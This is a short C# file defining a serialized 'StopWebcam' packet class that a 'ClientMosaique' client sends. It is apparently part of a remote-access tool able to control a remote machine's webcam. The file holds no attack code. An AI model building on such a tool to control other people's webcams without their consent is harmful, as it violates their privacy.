using Client.Controllers;
using ZeroFormatter;

namespace Client.Packets.ServerPackets
{
    [ZeroFormattable]
    public class StopWebcam : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.StopWebcam;
            }
        }

        public StopWebcam()
        {
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
